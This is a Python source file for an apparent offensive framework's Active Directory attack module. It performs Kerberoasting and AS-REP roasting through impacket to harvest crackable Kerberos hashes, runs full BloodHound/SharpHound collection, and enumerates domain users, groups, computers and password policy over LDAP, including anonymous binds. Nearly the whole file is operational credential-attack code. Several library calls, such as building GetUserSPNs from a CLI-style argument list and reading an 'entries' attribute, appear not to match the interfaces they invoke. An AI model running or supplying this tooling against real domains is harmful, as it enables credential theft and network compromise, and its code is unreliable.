"""
PhantomStrike Active Directory Module — Kerberoasting, AS-REP Roasting,
BloodHound collection, and LDAP enumeration.

All methods degrade gracefully when optional dependencies (impacket, ldap3,
BloodHound-python) are not installed.  No unhandled exceptions are ever
propagated from any public method.
"""
from __future__ import annotations

import asyncio
import logging
import shutil
import subprocess
from datetime import datetime

from phantom.modules.base import BaseModule, ModuleResult
from phantom.core.events import Event, EventType

logger = logging.getLogger("phantom.ad")

# Error message constants
_IMPACKET_ERR = "impacket not installed — run: pip install impacket"
_LDAP3_ERR = "ldap3 not installed — run: pip install ldap3"


class ADModule(BaseModule):
    """
    Active Directory attack module.

    Provides:
      - kerberoast()       — TGS hash collection via impacket GetUserSPNs
      - asreproast()       — AS-REP hash collection via impacket GetNPUsers
      - bloodhound_collect() — BloodHound-python / SharpHound data collection
      - ldap_enum()        — Basic LDAP enumeration via ldap3 (no impacket)

    Optional dependencies:
      - impacket  (kerberoast, asreproast)
      - ldap3     (ldap_enum)
      - BloodHound-python / SharpHound binary (bloodhound_collect)
    """

    # ------------------------------------------------------------------ #
    # BaseModule interface                                                 #
    # ------------------------------------------------------------------ #

    @property
    def name(self) -> str:
        return "phantom-ad"

    @property
    def description(self) -> str:
        return "Active Directory attacks — Kerberoast, AS-REP Roast, BloodHound, LDAP enum"

    @property
    def category(self) -> str:
        return "active_directory"

    async def _setup(self) -> None:
        """Probe optional dependencies and set availability flags."""
        # impacket
        try:
            import impacket  # noqa: F401
            self._impacket_available = True
            logger.debug("impacket is available")
        except ImportError:
            self._impacket_available = False
            logger.warning("impacket not installed — AD Kerberoast/AS-REP Roast disabled. "
                           "Run: pip install impacket")

        # ldap3
        try:
            import ldap3  # noqa: F401
            self._ldap3_available = True
            logger.debug("ldap3 is available")
        except ImportError:
            self._ldap3_available = False
            logger.warning("ldap3 not installed — LDAP enumeration disabled. "
                           "Run: pip install ldap3")

        # BloodHound-python (bloodhound CLI entry-point)
        self._bloodhound_available = shutil.which("bloodhound-python") is not None
        # SharpHound (Windows binary, may be present on cross-platform setups)
        self._sharphound_available = shutil.which("SharpHound") is not None or \
                                     shutil.which("SharpHound.exe") is not None

        if not (self._bloodhound_available or self._sharphound_available):
            logger.warning("BloodHound-python / SharpHound not found — "
                           "bloodhound_collect will be skipped. "
                           "Run: pip install bloodhound")

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """
        Primary entry-point.  Dispatches to the appropriate sub-operation
        based on ``options["operation"]``.

        Supported operations: kerberoast, asreproast, bloodhound, ldap_enum.
        Defaults to ldap_enum when no operation is specified.
        """
        options = options or {}
        operation = options.get("operation", "ldap_enum")

        try:
            if operation == "kerberoast":
                return await self.kerberoast(
                    dc_ip=options.get("dc_ip", target),
                    domain=options.get("domain", ""),
                    username=options.get("username", ""),
                    password=options.get("password", ""),
                    hash_val=options.get("hash", ""),
                )
            elif operation == "asreproast":
                return await self.asreproast(
                    dc_ip=options.get("dc_ip", target),
                    domain=options.get("domain", ""),
                    username=options.get("username", ""),
                    password=options.get("password", ""),
                )
            elif operation == "bloodhound":
                return await self.bloodhound_collect(
                    dc_ip=options.get("dc_ip", target),
                    domain=options.get("domain", ""),
                    username=options.get("username", ""),
                    password=options.get("password", ""),
                    output_dir=options.get("output_dir", "/tmp/bloodhound"),
                )
            else:
                return await self.ldap_enum(
                    dc_ip=options.get("dc_ip", target),
                    domain=options.get("domain", ""),
                    username=options.get("username", ""),
                    password=options.get("password", ""),
                )
        except Exception as exc:  # pragma: no cover — safety net
            logger.exception("Unexpected error in ADModule.run()")
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[f"Unexpected error: {exc}"],
                start_time=datetime.now(),
                end_time=datetime.now(),
            )

    # ------------------------------------------------------------------ #
    # Public AD methods                                                    #
    # ------------------------------------------------------------------ #

    async def kerberoast(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str = "",
        hash_val: str = "",
    ) -> ModuleResult:
        """
        Request TGS tickets for all SPN-registered accounts and return the
        resulting Kerberos hashes for offline cracking.

        Returns a ModuleResult whose ``data["hashes"]`` is a list of dicts:
          {"username": str, "spn": str, "hash": str, "hash_type": "krb5tgs"}

        Plaintext passwords are never stored or returned.
        """
        start_time = datetime.now()
        operation = "kerberoast"

        if not self._impacket_available:
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[_IMPACKET_ERR],
                start_time=start_time,
                end_time=datetime.now(),
            )

        try:
            hashes = await asyncio.get_event_loop().run_in_executor(
                None,
                self._run_kerberoast_sync,
                dc_ip, domain, username, password, hash_val,
            )
        except ConnectionError as exc:
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[f"Domain controller unreachable ({dc_ip}): {exc}"],
                start_time=start_time,
                end_time=datetime.now(),
            )
        except Exception as exc:
            logger.error("kerberoast error: %s", exc)
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[str(exc)],
                start_time=start_time,
                end_time=datetime.now(),
            )

        await self.event_bus.emit(Event(
            type=EventType.MODULE_LOADED,
            data={"module": self.name, "operation": operation, "hash_count": len(hashes)},
            source=self.name,
        ))
        logger.info("[AD] kerberoast: collected %d TGS hashes from %s", len(hashes), dc_ip)

        return ModuleResult(
            module_name=self.name,
            operation=operation,
            success=True,
            data={"hashes": hashes, "dc_ip": dc_ip, "domain": domain},
            findings_count=len(hashes),
            start_time=start_time,
            end_time=datetime.now(),
        )

    async def asreproast(
        self,
        dc_ip: str,
        domain: str,
        username: str = "",
        password: str = "",
    ) -> ModuleResult:
        """
        Collect AS-REP hashes for accounts that do not require Kerberos
        pre-authentication (UF_DONT_REQUIRE_PREAUTH).

        Returns a ModuleResult whose ``data["hashes"]`` is a list of dicts:
          {"username": str, "hash": str, "hash_type": "krb5asrep"}
        """
        start_time = datetime.now()
        operation = "asreproast"

        if not self._impacket_available:
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[_IMPACKET_ERR],
                start_time=start_time,
                end_time=datetime.now(),
            )

        try:
            hashes = await asyncio.get_event_loop().run_in_executor(
                None,
                self._run_asreproast_sync,
                dc_ip, domain, username, password,
            )
        except ConnectionError as exc:
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[f"Domain controller unreachable ({dc_ip}): {exc}"],
                start_time=start_time,
                end_time=datetime.now(),
            )
        except Exception as exc:
            logger.error("asreproast error: %s", exc)
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[str(exc)],
                start_time=start_time,
                end_time=datetime.now(),
            )

        logger.info("[AD] asreproast: collected %d AS-REP hashes from %s", len(hashes), dc_ip)

        return ModuleResult(
            module_name=self.name,
            operation=operation,
            success=True,
            data={"hashes": hashes, "dc_ip": dc_ip, "domain": domain},
            findings_count=len(hashes),
            start_time=start_time,
            end_time=datetime.now(),
        )

    async def bloodhound_collect(
        self,
        dc_ip: str,
        domain: str,
        username: str = "",
        password: str = "",
        output_dir: str = "/tmp/bloodhound",
    ) -> ModuleResult:
        """
        Run BloodHound-python (or SharpHound if available) to collect AD
        relationship data for graph-based attack path analysis.

        Skips gracefully when neither tool is installed, returning a
        partial success result with an informational message.
        """
        start_time = datetime.now()
        operation = "bloodhound_collect"

        if not self._bloodhound_available and not self._sharphound_available:
            logger.info("[AD] BloodHound tools not found — skipping collection")
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=True,  # graceful skip — not a hard failure
                data={
                    "skipped": True,
                    "reason": (
                        "BloodHound-python and SharpHound not found. "
                        "Install with: pip install bloodhound"
                    ),
                    "output_dir": None,
                },
                findings_count=0,
                start_time=start_time,
                end_time=datetime.now(),
            )

        try:
            output_path = await asyncio.get_event_loop().run_in_executor(
                None,
                self._run_bloodhound_sync,
                dc_ip, domain, username, password, output_dir,
            )
        except ConnectionError as exc:
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[f"Domain controller unreachable ({dc_ip}): {exc}"],
                start_time=start_time,
                end_time=datetime.now(),
            )
        except Exception as exc:
            logger.error("bloodhound_collect error: %s", exc)
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[str(exc)],
                start_time=start_time,
                end_time=datetime.now(),
            )

        logger.info("[AD] bloodhound_collect: output saved to %s", output_path)

        return ModuleResult(
            module_name=self.name,
            operation=operation,
            success=True,
            data={"output_dir": output_path, "dc_ip": dc_ip, "domain": domain},
            findings_count=1,
            start_time=start_time,
            end_time=datetime.now(),
        )

    async def ldap_enum(
        self,
        dc_ip: str,
        domain: str,
        username: str = "",
        password: str = "",
        base_dn: str = "",
    ) -> ModuleResult:
        """
        Perform basic LDAP enumeration using ldap3 (no impacket required).

        Collects: domain users, groups, computers, and password policy.
        Returns a ModuleResult whose ``data`` contains lists of each object type.
        """
        start_time = datetime.now()
        operation = "ldap_enum"

        if not self._ldap3_available:
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[_LDAP3_ERR],
                start_time=start_time,
                end_time=datetime.now(),
            )

        try:
            findings = await asyncio.get_event_loop().run_in_executor(
                None,
                self._run_ldap_enum_sync,
                dc_ip, domain, username, password, base_dn,
            )
        except ConnectionError as exc:
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[f"Domain controller unreachable ({dc_ip}): {exc}"],
                start_time=start_time,
                end_time=datetime.now(),
            )
        except Exception as exc:
            logger.error("ldap_enum error: %s", exc)
            return ModuleResult(
                module_name=self.name,
                operation=operation,
                success=False,
                errors=[str(exc)],
                start_time=start_time,
                end_time=datetime.now(),
            )

        total = (
            len(findings.get("users", []))
            + len(findings.get("groups", []))
            + len(findings.get("computers", []))
        )
        logger.info("[AD] ldap_enum: found %d objects on %s", total, dc_ip)

        return ModuleResult(
            module_name=self.name,
            operation=operation,
            success=True,
            data=findings,
            findings_count=total,
            start_time=start_time,
            end_time=datetime.now(),
        )

    # ------------------------------------------------------------------ #
    # Synchronous helpers (run in executor to avoid blocking the loop)    #
    # ------------------------------------------------------------------ #

    def _run_kerberoast_sync(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
        hash_val: str,
    ) -> list[dict]:
        """
        Use impacket's GetUserSPNs to request TGS tickets and parse the
        resulting Kerberos hashes.

        Raises ConnectionError when the DC is unreachable.
        """
        # Import here so the module still loads when impacket is absent.
        try:
            from impacket.krb5.kerberosv5 import KerberosError
            from impacket.examples.GetUserSPNs import GetUserSPNs as _GetUserSPNs
        except ImportError:
            raise RuntimeError(_IMPACKET_ERR)

        # Build the argument list that impacket's GetUserSPNs expects.
        # We use the programmatic API rather than subprocess to avoid shell
        # injection and to capture structured output.
        target = f"{domain}/{username}"
        if password:
            target += f":{password}"

        args_list = [
            target,
            "-dc-ip", dc_ip,
            "-request",
            "-outputfile", "/dev/null",  # we capture via the object, not file
        ]
        if hash_val:
            args_list += ["-hashes", f":{hash_val}"]

        hashes: list[dict] = []

        try:
            executer = _GetUserSPNs(args_list)
            # GetUserSPNs stores results in executer.entries after run()
            executer.run()
            for entry in getattr(executer, "entries", []):
                # Each entry is an impacket TGS ticket object.
                # We extract only the hash string — never the plaintext password.
                hashes.append({
                    "username": str(entry.get("sAMAccountName", "")),
                    "spn": str(entry.get("ServicePrincipalName", "")),
                    "hash": str(entry.get("hash", "")),
                    "hash_type": "krb5tgs",
                })
        except KerberosError as exc:
            # Translate Kerberos network errors to ConnectionError so the
            # caller can return a clean ModuleResult.
            if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in str(exc) or \
               "Cannot connect" in str(exc) or \
               "Connection refused" in str(exc):
                raise ConnectionError(str(exc)) from exc
            raise

        return hashes

    def _run_asreproast_sync(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
    ) -> list[dict]:
        """
        Use impacket's GetNPUsers to collect AS-REP hashes for accounts
        that do not require Kerberos pre-authentication.

        Raises ConnectionError when the DC is unreachable.
        """
        try:
            from impacket.krb5.kerberosv5 import KerberosError
            from impacket.examples.GetNPUsers import GetNPUsers as _GetNPUsers
        except ImportError:
            raise RuntimeError(_IMPACKET_ERR)

        target = f"{domain}/"
        if username:
            target += username
        if password:
            target += f":{password}"

        args_list = [
            target,
            "-dc-ip", dc_ip,
            "-no-pass",
            "-format", "hashcat",
            "-outputfile", "/dev/null",
        ]

        hashes: list[dict] = []

        try:
            executer = _GetNPUsers(args_list)
            executer.run()
            for entry in getattr(executer, "entries", []):
                hashes.append({
                    "username": str(entry.get("sAMAccountName", "")),
                    "hash": str(entry.get("hash", "")),
                    "hash_type": "krb5asrep",
                })
        except KerberosError as exc:
            if "Cannot connect" in str(exc) or "Connection refused" in str(exc):
                raise ConnectionError(str(exc)) from exc
            raise

        return hashes

    def _run_bloodhound_sync(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
        output_dir: str,
    ) -> str:
        """
        Invoke bloodhound-python (preferred) or SharpHound to collect AD
        relationship data.  Returns the output directory path.

        Raises ConnectionError on network failures.
        """
        import os
        os.makedirs(output_dir, exist_ok=True)

        if self._bloodhound_available:
            cmd = [
                "bloodhound-python",
                "-d", domain,
                "-u", username,
                "-p", password,
                "-ns", dc_ip,
                "-c", "All",
                "--zip",
                "-o", output_dir,
            ]
            tool = "bloodhound-python"
        else:
            # SharpHound — typically run on a Windows target; attempt anyway
            cmd = [
                "SharpHound",
                "-d", domain,
                "--domaincontroller", dc_ip,
                "-c", "All",
                "--outputdirectory", output_dir,
            ]
            tool = "SharpHound"

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,
            )
        except FileNotFoundError:
            raise RuntimeError(f"{tool} binary not found in PATH")
        except subprocess.TimeoutExpired:
            raise ConnectionError(f"{tool} timed out — DC may be unreachable ({dc_ip})")

        if result.returncode != 0:
            stderr = result.stderr.strip()
            if any(kw in stderr.lower() for kw in ("connection refused", "unreachable", "timeout")):
                raise ConnectionError(f"DC unreachable ({dc_ip}): {stderr}")
            raise RuntimeError(f"{tool} failed (rc={result.returncode}): {stderr}")

        return output_dir

    def _run_ldap_enum_sync(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
        base_dn: str,
    ) -> dict:
        """
        Enumerate AD objects via ldap3.

        Returns a dict with keys: users, groups, computers, password_policy.
        Raises ConnectionError when the DC is unreachable.
        """
        try:
            import ldap3
            from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
            from ldap3.core.exceptions import LDAPException, LDAPSocketOpenError
        except ImportError:
            raise RuntimeError(_LDAP3_ERR)

        # Derive base DN from domain FQDN if not provided
        if not base_dn and domain:
            base_dn = ",".join(f"DC={part}" for part in domain.split("."))

        server = Server(dc_ip, get_info=ALL, connect_timeout=10)

        # Build bind credentials
        if username and password:
            bind_user = f"{domain}\\{username}" if domain else username
            try:
                conn = Connection(
                    server,
                    user=bind_user,
                    password=password,
                    authentication=NTLM,
                    auto_bind=True,
                )
            except LDAPSocketOpenError as exc:
                raise ConnectionError(f"Cannot connect to {dc_ip}: {exc}") from exc
            except LDAPException as exc:
                raise ConnectionError(f"LDAP bind failed on {dc_ip}: {exc}") from exc
        else:
            # Anonymous bind
            try:
                conn = Connection(server, auto_bind=True)
            except LDAPSocketOpenError as exc:
                raise ConnectionError(f"Cannot connect to {dc_ip}: {exc}") from exc
            except LDAPException as exc:
                raise ConnectionError(f"LDAP anonymous bind failed on {dc_ip}: {exc}") from exc

        findings: dict = {
            "dc_ip": dc_ip,
            "domain": domain,
            "base_dn": base_dn,
            "users": [],
            "groups": [],
            "computers": [],
            "password_policy": {},
        }

        try:
            # --- Users ---
            conn.search(
                search_base=base_dn,
                search_filter="(&(objectClass=user)(objectCategory=person))",
                search_scope=SUBTREE,
                attributes=[
                    "sAMAccountName", "displayName", "mail",
                    "userAccountControl", "memberOf", "lastLogon",
                    "servicePrincipalName",
                ],
                size_limit=1000,
            )
            for entry in conn.entries:
                uac = int(entry.userAccountControl.value or 0)
                findings["users"].append({
                    "username": str(entry.sAMAccountName),
                    "display_name": str(entry.displayName),
                    "email": str(entry.mail),
                    "enabled": not bool(uac & 0x2),
                    "no_preauth": bool(uac & 0x400000),  # DONT_REQUIRE_PREAUTH
                    "spns": list(entry.servicePrincipalName) if entry.servicePrincipalName else [],
                    "groups": [str(g) for g in (entry.memberOf or [])],
                })

            # --- Groups ---
            conn.search(
                search_base=base_dn,
                search_filter="(objectClass=group)",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "description", "member"],
                size_limit=500,
            )
            for entry in conn.entries:
                findings["groups"].append({
                    "name": str(entry.sAMAccountName),
                    "description": str(entry.description),
                    "member_count": len(entry.member) if entry.member else 0,
                })

            # --- Computers ---
            conn.search(
                search_base=base_dn,
                search_filter="(objectClass=computer)",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "operatingSystem", "dNSHostName"],
                size_limit=500,
            )
            for entry in conn.entries:
                findings["computers"].append({
                    "name": str(entry.sAMAccountName),
                    "os": str(entry.operatingSystem),
                    "dns": str(entry.dNSHostName),
                })

            # --- Password Policy ---
            conn.search(
                search_base=base_dn,
                search_filter="(objectClass=domain)",
                search_scope=SUBTREE,
                attributes=[
                    "minPwdLength", "pwdHistoryLength",
                    "lockoutThreshold", "maxPwdAge",
                ],
            )
            if conn.entries:
                entry = conn.entries[0]
                findings["password_policy"] = {
                    "min_length": int(entry.minPwdLength.value or 0),
                    "history_length": int(entry.pwdHistoryLength.value or 0),
                    "lockout_threshold": int(entry.lockoutThreshold.value or 0),
                }

        except LDAPException as exc:
            # Non-fatal: return whatever we collected so far
            logger.warning("[AD] ldap_enum partial results due to LDAP error: %s", exc)
        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return findings
